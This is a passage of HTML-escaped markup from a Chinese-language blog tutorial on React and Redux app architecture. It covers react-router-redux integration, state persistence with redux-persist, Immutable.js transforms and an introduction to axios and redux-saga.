/\u0026gt;\u003c/code\u003e声明渲染的；\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e这是为什么呢？，因为Redux会实现组件的\u003ccode\u003eshouldComponentUpdate\u003c/code\u003e方法，当路由变化时，该组件并没有接收到props表明发生了变更，需要更新组件。\u003c/p\u003e\n\u003cp\u003e那么如何解决问题呢？，要解决这个问题只需要简单的使用\u003ccode\u003ereact-router-dom\u003c/code\u003e提供的\u003ccode\u003ewithRouter\u003c/code\u003e方法包裹组件：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e { withRouter } \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'react-router-dom'\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003edefault\u003c/span\u003e withRouter(connect(mapStateToProps)(Home))\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003eRedux整合\u003c/h3\u003e\n\u003cp\u003e在使用Redux以后，需要遵循redux的原则：单一可信数据来源，即所有数据来源都只能是reudx store，react路由状态也不应例外，所以需要将路由state与store state连接。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003ereact-router-redux\u003c/h4\u003e\n\u003cp\u003e连接React Router与Redux，需要使用\u003ccode\u003ereact-router-redux\u003c/code\u003e库，而且react-router v4版本需要指定安装\u003ccode\u003e@next\u003c/code\u003e版本和\u003ccode\u003ehsitory\u003c/code\u003e库：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs shell\" lang=\"shell\"\u003eyarn add react-router-redux@next\nyarn add history\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e然后，在创建store时，需要实现如下配置：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e创建一个history对象，对于web应用，我们选择browserHisotry，对应需要从\u003ccode\u003ehistory/createBrowserHistory\u003c/code\u003e模块引入\u003ccode\u003ecreateHistory\u003c/code\u003e方法以创建history对象；\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://reacttraining.com/react-router/web/api/history\"\u003e点此查看更多history相关内容\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e添加\u003ccode\u003erouterReducer\u003c/code\u003e和\u003ccode\u003erouterMiddleware\u003c/code\u003e中间件“，其中\u003ccode\u003erouterMiddleware\u003c/code\u003e中间件接收history对象参数，连接store和history，等同于旧版本的\u003ccode\u003esyncHistoryWithStore\u003c/code\u003e；\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e createHistory \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'history/createBrowserHistory'\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e { ConnectedRouter, routerReducer, routerMiddleware, push } \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'react-router-redux'\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e// Create a history of your choosing (we're using a browser history in this case)\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e history = createHistory()\n\n\u003cspan class=\"hljs-comment\"\u003e// Build the middleware for intercepting and dispatching navigation actions\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e middleware = routerMiddleware(history)\n\n\u003cspan class=\"hljs-comment\"\u003e// Add the reducer to your store on the `router` key\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e// Also apply our middleware for navigating\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e store = createStore(\n  combineReducers({\n    ...reducers,\n    \u003cspan class=\"hljs-attr\"\u003erouter\u003c/span\u003e: routerReducer\n  }),\n  applyMiddleware(middleware)\n)\n\n\u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e store\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e在渲染根组件时，我们抽象出两个组件：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e初始化渲染根组件，挂载至DOM的根组件，由\u003ccode\u003e\u0026lt;Provider\u0026gt;\u003c/code\u003e组件包裹，注入store；\u003c/li\u003e\n\u003cli\u003e路由配置组件，在根组件中，声明路由配置组件，初始化必要的应用路由定义及路由对象；\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e createStore \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'./store/'\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e Routes \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'./routes/'\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e appReducer \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'./store/appRedux'\u003c/span\u003e\n\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e store = createStore({}, {\n  \u003cspan class=\"hljs-attr\"\u003eapp\u003c/span\u003e: appReducer\n})\n\n\u003cspan class=\"hljs-comment\"\u003e/**\n * 项目根组件\n * @class App\n * @extends Component\n */\u003c/span\u003e\n\u003cspan class=\"hljs-class\"\u003e\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eApp\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eextends\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eComponent\u003c/span\u003e \u003c/span\u003e{\n  render () {\n    \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e { store } = \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.props\n\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e (\n      \u003cspan class=\"xml\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eProvider\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003estore\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e{store}\u003c/span\u003e\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n          \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eRoutes\u003c/span\u003e /\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eProvider\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003c/span\u003e\n    )\n  }\n}\n\n\u003cspan class=\"hljs-comment\"\u003e// 渲染根组件\u003c/span\u003e\nReactDOM.render(\n  \u003cspan class=\"xml\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eApp\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003estore\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e{store}\u003c/span\u003e /\u0026gt;\u003c/span\u003e,\n  document.getElementById('app')\n)\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e上面的\u003ccode\u003e\u0026lt;Routes\u0026gt;\u003c/code\u003e组件是项目的路由组件：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e { history } \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'../store/'\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e { ConnectedRouter } \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'react-router-redux'\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e { Route } \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'react-router'\u003c/span\u003e\n\n\u003cspan class=\"hljs-class\"\u003e\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eRoutes\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eextends\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eComponent\u003c/span\u003e \u003c/span\u003e{\n  render () {\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e (\n      \u0026lt;ConnectedRouter history={history}\u0026gt;\n        \u0026lt;div\u0026gt;\n          \u0026lt;BlogHeader /\u0026gt;\n          \u0026lt;div\u0026gt;\n            \u0026lt;Route exact path='/' component={Home} /\u0026gt;\n            \u0026lt;Route exact path='/posts/:id' component={Article} /\u0026gt;\n          \u0026lt;/div\u0026gt;\n        \u0026lt;/div\u0026gt;\n      \u0026lt;/ConnectedRouter\u0026gt;\n    )\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e首先使用\u003ccode\u003ereact-router-redux\u003c/code\u003e提供的\u003ccode\u003eConnectedRouter\u003c/code\u003e组件包裹路由配置，该组件将自动使用\u003ccode\u003e\u0026lt;Provider\u0026gt;\u003c/code\u003e组件注入的\u003ccode\u003estore\u003c/code\u003e，我们需要做的是手动传入\u003ccode\u003ehistory\u003c/code\u003e属性，在组件内会调用\u003ccode\u003ehistory.listen\u003c/code\u003e方法监听浏览器\u003ccode\u003eLOCATION_CHANGE\u003c/code\u003e事件，最后返回\u003ccode\u003ereact-router\u003c/code\u003e的\u003ccode\u003e\u0026lt;Router \u0026gt;\u003c/code\u003e组件，处理作为\u003ccode\u003ethis.props.children\u003c/code\u003e传入的路由配置，\u003ca target=\"_blank\" href=\"https://github.com/ReactTraining/react-router/blob/master/packages/react-router-redux/modules/ConnectedRouter.js\"\u003eConnectedRouter组件内容传送\u003c/a\u003e。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003edispatch切换路由\u003c/h4\u003e\n\u003cp\u003e配置上面代码后，就能够以dispatch action的方式触发路由切换和组件更新了：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs react\" lang=\"react\"\u003eimport\u0026nbsp;{\u0026nbsp;push\u0026nbsp;}\u0026nbsp;from\u0026nbsp;'react-router-redux'\u003cbr\u003e//\u0026nbsp;Now\u0026nbsp;you\u0026nbsp;can\u0026nbsp;dispatch\u0026nbsp;navigation\u0026nbsp;actions\u0026nbsp;from\u0026nbsp;anywhere!\u003cbr\u003estore.dispatch(push('/about'))\u003cbr\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这个reducer所做的只是将App导航路由状态合并入store。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003eredux持久化\u003c/h2\u003e\n\u003cp\u003e我们知道浏览器默认有资源的缓存功能并且提供本地持久化存储方式如localStorage，indexDb，webSQL等，通常可以将某些数据存储在本地，在一定周期内，当用户再次访问时，直接从本地恢复数据，可以极大提高应用启动速度，用户体验更有优势，我们可以使用localStorage存储一些数据，如果是较大量数据存储可以使用webSQL。\u003c/p\u003e\n\u003cp\u003e另外不同于以往的直接存储数据，启动应用时本地读取然后恢复数据，对于redux应用而言，如果只是存储数据，那么我们就得为每一个reducer拓展，当再次启动应用时去读取持久化的数据，这是比较繁琐而且低效的方式，是否可以尝试存储reducer key，然后根据key恢复对应的持久化数据，首先注册Rehydrate reducer，当触发action时根据其reducer key恢复数据，然后只需要在应用启动时分发action，这也很容易抽象成可配置的拓展服务，实际上三方库\u003ca target=\"_blank\" href=\"https://github.com/rt2zz/redux-persist\"\u003eredux-persist\u003c/a\u003e已经为我们做好了这一切。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003eredux-persist\u003c/h3\u003e\n\u003cp\u003e要实现redux的持久化，包括redux store的本地持久化存储及恢复启动两个过程，如果完全自己编写实现，代码量比较复杂，可以使用开源库\u003ccode\u003eredux-persist\u003c/code\u003e，它提供\u003ccode\u003epersistStore\u003c/code\u003e和\u003ccode\u003eautoRehydrate\u003c/code\u003e方法分别持久化本地存储store及恢复启动store，另外还支持自定义传入持久化及恢复store时对store state的转换拓展。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs shell\" lang=\"shell\"\u003eyarn add redux-persist\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003e持久化store\u003c/h4\u003e\n\u003cp\u003e如下在创建store时会调用persistStore相关服务-\u003ccode\u003eRehydrationServices.updateReducers()\u003c/code\u003e：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs react\" lang=\"react\"\u003e//\u0026nbsp;configure\u0026nbsp;persistStore\u0026nbsp;and\u0026nbsp;check\u0026nbsp;reducer\u0026nbsp;version\u0026nbsp;number\u003cbr\u003eif\u0026nbsp;(ReduxPersistConfig.active)\u0026nbsp;{\u003cbr\u003e\u0026nbsp;\u0026nbsp;RehydrationServices.updateReducers(store);\u003cbr\u003e}\u003cbr\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e该方法内实现了store的持久化存储：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs react\" lang=\"react\"\u003e//\u0026nbsp;Check\u0026nbsp;to\u0026nbsp;ensure\u0026nbsp;latest\u0026nbsp;reducer\u0026nbsp;version\u003cbr\u003estorage.getItem('reducerVersion').then((localVersion)\u0026nbsp;=\u0026gt;\u0026nbsp;{\u003cbr\u003e\u0026nbsp;\u0026nbsp;if\u0026nbsp;(localVersion\u0026nbsp;!==\u0026nbsp;reducerVersion)\u0026nbsp;{\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;//\u0026nbsp;清空\u0026nbsp;store\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;persistStore(store,\u0026nbsp;null,\u0026nbsp;startApp).purge();\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;storage.setItem('reducerVersion',\u0026nbsp;reducerVersion);\u003cbr\u003e\u0026nbsp;\u0026nbsp;}\u0026nbsp;else\u0026nbsp;{\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;persistStore(store,\u0026nbsp;null,\u0026nbsp;startApp);\u003cbr\u003e\u0026nbsp;\u0026nbsp;}\u003cbr\u003e}).catch(()\u0026nbsp;=\u0026gt;\u0026nbsp;{\u003cbr\u003e\u0026nbsp;\u0026nbsp;persistStore(store,\u0026nbsp;null,\u0026nbsp;startApp);\u003cbr\u003e\u0026nbsp;\u0026nbsp;storage.setItem('reducerVersion',\u0026nbsp;reducerVersion);\u003cbr\u003e})\u003cbr\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e会在localStorage存储一个reducer版本号，这个是在应用配置文件中可以配置，首次执行持久化时存储该版本号及store，若reducer版本号变更则清空原来存储的store，否则传入store给持久化方法\u003ccode\u003epersistStore\u003c/code\u003e即可。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003epersistStore(store, [config], [callback])\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e该方法主要实现store的持久化以及分发rehydration action :\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e订阅 redux store，当其发生变化时触发store存储操作；\u003c/li\u003e\n\u003cli\u003e从指定的StorageEngine（如localStorage）中获取数据，进行转换，然后通过分发 REHYDRATE action，触发 REHYDRATE 过程；\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e接收参数主要如下：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003estore: 持久化的store；\u003c/li\u003e\n\u003cli\u003econfig：配置对象\n\u003col\u003e\n\u003cli\u003estorage：一个 持久化引擎，例如 LocalStorage 和 AsyncStorage；\u003c/li\u003e\n\u003cli\u003etransforms： 在 rehydration 和 storage 阶段被调用的转换器；\u003c/li\u003e\n\u003cli\u003eblacklist： 黑名单数组，指定持久化忽略的 reducers 的 key；\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003ecallback：ehydration 操作结束后的回调；\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch4 class=\"heading\"\u003e恢复启动\u003c/h4\u003e\n\u003cp\u003e和persisStore一样，依然是在创建redux store时初始化注册rehydrate拓展：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs react\" lang=\"react\"\u003e//\u0026nbsp;add\u0026nbsp;the\u0026nbsp;autoRehydrate\u0026nbsp;enhancer\u003cbr\u003eif\u0026nbsp;(ReduxPersist.active)\u0026nbsp;{\u003cbr\u003e\u0026nbsp;\u0026nbsp;enhancers.push(autoRehydrate());\u003cbr\u003e}\u003cbr\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e该方法实现的功能很简单，即使用 持久化的数据恢复(rehydrate) store 中数据，它其实是注册了一个autoRehydarte reducer，会接收前文persistStore方法分发的rehydrate action，然后合并state。\u003c/p\u003e\n\u003cp\u003e当然，autoRehydrate不是必须的，我们可以自定义恢复store方式：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs react\" lang=\"react\"\u003eimport\u0026nbsp;{REHYDRATE}\u0026nbsp;from\u0026nbsp;'redux-persist/constants';\u003cbr\u003e\u003cbr\u003e//...\u003cbr\u003ecase\u0026nbsp;REHYDRATE:\u003cbr\u003e\u0026nbsp;\u0026nbsp;const\u0026nbsp;incoming\u0026nbsp;=\u0026nbsp;action.payload.reducer\u003cbr\u003e\u0026nbsp;\u0026nbsp;if\u0026nbsp;(incoming)\u0026nbsp;{\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;return\u0026nbsp;{\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;...state,\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;...incoming\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;}\u003cbr\u003e\u0026nbsp;\u0026nbsp;}\u003cbr\u003e\u0026nbsp;\u0026nbsp;return\u0026nbsp;state;\u003cbr\u003e\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003e版本更新\u003c/h4\u003e\n\u003cp\u003e需要注意的是redux-persist库已经发布到v5.x，而本文介绍的以v5.x为例，\u003ca target=\"_blank\" href=\"https://github.com/rt2zz/redux-persist/tree/f4a6e86c66693a0bd5e6ea73043fd98b14f44a96\"\u003ev4.x\u003c/a\u003e参考此处，新版本有一些更新，可以选择性决定使用哪个版本，\u003ca target=\"_blank\" href=\"https://github.com/rt2zz/redux-persist/releases\"\u003e详细请点击查看\u003c/a\u003e。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e持久化与Immutable\u003c/h3\u003e\n\u003cp\u003e前面已经提到Redux与Immutable的整合，上文使用的redux -persist默认也只能处理原生JavaScript对象的redux store state，所以需要拓展以兼容Immutable。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003eredux-persist-immutable\u003c/h4\u003e\n\u003cp\u003e使用\u003ca target=\"_blank\" href=\"https://github.com/rt2zz/redux-persist-immutable\"\u003eredux-persist-immutable\u003c/a\u003e库可以很容易实现兼容，所做的仅仅是使用其提供的\u003ccode\u003epersistStore\u003c/code\u003e方法替换redux-persist所提供的方法：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs react\" lang=\"react\"\u003eimport\u0026nbsp;{\u0026nbsp;persistStore\u0026nbsp;}\u0026nbsp;from\u0026nbsp;'redux-persist-immutable';\u003cbr\u003e\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003etransform\u003c/h4\u003e\n\u003cp\u003e我们知道持久化store时，针对的最好是原生JavaScript对象，因为通常Immutable结构数据有很多辅助信息，不易于存储，所以需要定义持久化及恢复数据时的转换操作：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs react\" lang=\"react\"\u003eimport\u0026nbsp;R\u0026nbsp;from\u0026nbsp;'ramda';\u003cbr\u003eimport\u0026nbsp;Immutable,\u0026nbsp;{\u0026nbsp;Iterable\u0026nbsp;}\u0026nbsp;from\u0026nbsp;'immutable';\u003cbr\u003e\u003cbr\u003e//\u0026nbsp;change\u0026nbsp;this\u0026nbsp;Immutable\u0026nbsp;object\u0026nbsp;into\u0026nbsp;a\u0026nbsp;JS\u0026nbsp;object\u003cbr\u003econst\u0026nbsp;convertToJs\u0026nbsp;=\u0026nbsp;(state)\u0026nbsp;=\u0026gt;\u0026nbsp;state.toJS();\u003cbr\u003e\u003cbr\u003e//\u0026nbsp;optionally\u0026nbsp;convert\u0026nbsp;this\u0026nbsp;object\u0026nbsp;into\u0026nbsp;a\u0026nbsp;JS\u0026nbsp;object\u0026nbsp;if\u0026nbsp;it\u0026nbsp;is\u0026nbsp;Immutable\u003cbr\u003econst\u0026nbsp;fromImmutable\u0026nbsp;=\u0026nbsp;R.when(Iterable.isIterable,\u0026nbsp;convertToJs);\u003cbr\u003e\u003cbr\u003e//\u0026nbsp;convert\u0026nbsp;this\u0026nbsp;JS\u0026nbsp;object\u0026nbsp;into\u0026nbsp;an\u0026nbsp;Immutable\u0026nbsp;object\u003cbr\u003econst\u0026nbsp;toImmutable\u0026nbsp;=\u0026nbsp;(raw)\u0026nbsp;=\u0026gt;\u0026nbsp;Immutable.fromJS(raw);\u003cbr\u003e\u003cbr\u003e//\u0026nbsp;the\u0026nbsp;transform\u0026nbsp;interface\u0026nbsp;that\u0026nbsp;redux-persist\u0026nbsp;is\u0026nbsp;expecting\u003cbr\u003eexport\u0026nbsp;default\u0026nbsp;{\u003cbr\u003e\u0026nbsp;\u0026nbsp;out:\u0026nbsp;(state)\u0026nbsp;=\u0026gt;\u0026nbsp;{\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;return\u0026nbsp;toImmutable(state);\u003cbr\u003e\u0026nbsp;\u0026nbsp;},\u003cbr\u003e\u0026nbsp;\u0026nbsp;in:\u0026nbsp;(raw)\u0026nbsp;=\u0026gt;\u0026nbsp;{\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;return\u0026nbsp;fromImmutable(raw);\u003cbr\u003e\u0026nbsp;\u0026nbsp;}\u003cbr\u003e};\u003cbr\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e如上，输出对象中的in和out分别对应持久化及恢复数据时的转换操作，实现的只是使用\u003ccode\u003efromJS()\u003c/code\u003e和\u003ccode\u003etoJS()\u003c/code\u003e转换Js和Immutable数据结构，使用方式如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs react\" lang=\"react\"\u003eimport\u0026nbsp;immutablePersistenceTransform\u0026nbsp;from\u0026nbsp;'../services/ImmutablePersistenceTransform'\u003cbr\u003epersistStore(store,\u0026nbsp;{\u003cbr\u003e\u0026nbsp;\u0026nbsp;transforms:\u0026nbsp;[immutablePersistenceTransform]\u003cbr\u003e},\u0026nbsp;startApp);\u003cbr\u003e\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003eImmutable\u003c/h2\u003e\n\u003cp\u003e在项目中引入Immutable以后，需要尽量保证以下几点：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eredux store整个state树的统一Immutable化；\u003c/li\u003e\n\u003cli\u003eredux持久化对Immutable数据的兼容；\u003c/li\u003e\n\u003cli\u003eReact路由兼容Immutable；\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e关于Immutable及Redux，Reselect等的实践考验查看之前写的一篇文章：\u003ca target=\"_blank\" href=\"http://blog.codingplayboy.com/2017/09/14/immutable-react-redux/\"\u003eImmutable.js与React,Redux及reselect的实践\u003c/a\u003e。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003eImmutable与React路由\u003c/h3\u003e\n\u003cp\u003e前面两点已经在前面两节阐述过，第三点react-router兼容Immutable，其实就是使应用路由状态兼容Immutable，在React路由一节已经介绍如何将React路由状态连接至Redux store，但是如果应用使用了Immutable库，则还需要额外处理，将react-router state转换为Immutable格式，routeReducer不能处理Immutable，我们需要自定义一个新的RouterReducer：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e Immutable \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'immutable'\u003c/span\u003e;\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e { LOCATION_CHANGE } \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'react-router-redux'\u003c/span\u003e;\n\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e initialState = Immutable.fromJS({\n  \u003cspan class=\"hljs-attr\"\u003elocation\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e\n});\n\n\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003edefault\u003c/span\u003e (state = initialState, action) =\u0026gt; {\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (action.type === LOCATION_CHANGE) {\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e state.set(\u003cspan class=\"hljs-string\"\u003e'location'\u003c/span\u003e, action.payload);\n  }\n  \n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e state;\n};\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e将默认初始路由状态转换为Immutable，并且路由变更时使用Immutable API操作state。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003eseamless-Immutable\u003c/h3\u003e\n\u003cp\u003e当引入Immutable.js后，对应用状态数据结构的使用API就得遵循Immutable API，而不能再使用原生JavaScript对象，数组等的操作API了，诸如，数组解构（[a, b] = [b, c]），对象拓展符（...）等，存在一些问题：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eImmutable数据辅助节点较多，数据较大：\u003c/li\u003e\n\u003cli\u003e必须使用Immutable语法，和JavaScript语法有差异，不能很好的兼容；\u003c/li\u003e\n\u003cli\u003e和Redux，react-router等JavaScript库写协作时，需要引入额外的兼容处理库；\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e针对这些问题，社区有了\u003ccode\u003eseamless-immutable\u003c/code\u003e可供替换选择：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e更轻：相对于Immutable.js\u003ccode\u003eseamless-immutable\u003c/code\u003e库更轻小；\u003c/li\u003e\n\u003cli\u003e语法：对象和数组的操作语法更贴近原生JavaScript；\u003c/li\u003e\n\u003cli\u003e和其他JavaScript库协作更方便；\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2 class=\"heading\"\u003e异步任务流管理\u003c/h2\u003e\n\u003cp\u003e最后要介绍的模块是异步任务管理，在应用开发过程中，最主要的异步任务就是数据HTTP请求，所以我们讲异步任务管理，主要关注在数据HTTP请求的流程管理。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003eaxios\u003c/h3\u003e\n\u003cp\u003e本项目中使用\u003ca target=\"_blank\" href=\"https://github.com/axios/axios\"\u003eaxios\u003c/a\u003e作为HTTP请求库，axios是一个Promise格式的HTTP客户端，选择此库的原因主要有以下几点：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e能在浏览器发起XMLHttpRequest，也能在node.js端发起HTTP请求；\u003c/li\u003e\n\u003cli\u003e支持Promise；\u003c/li\u003e\n\u003cli\u003e能拦截请求和响应；\u003c/li\u003e\n\u003cli\u003e能取消请求；\u003c/li\u003e\n\u003cli\u003e自动转换JSON数据；\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 class=\"heading\"\u003eredux-saga\u003c/h3\u003e\n\u003cp\u003eredux-saga是一个致力于使应用中如数据获取，本地缓存访问等异步任务易于管理，高效运行，便于测试，能更好的处理异常的三方库。\u003c/p\u003e\n\u003cp\u003eRedux-saga是一个redux中间件，它就像应用中一个单独的进程，只负责管理异步任务，它可以接受应用主进程的redux action以决定启动，暂停或者是取消进程任务，它也可以访问redux应用store state，然后分发action。\u003c/p\u003e\n\u003ch4 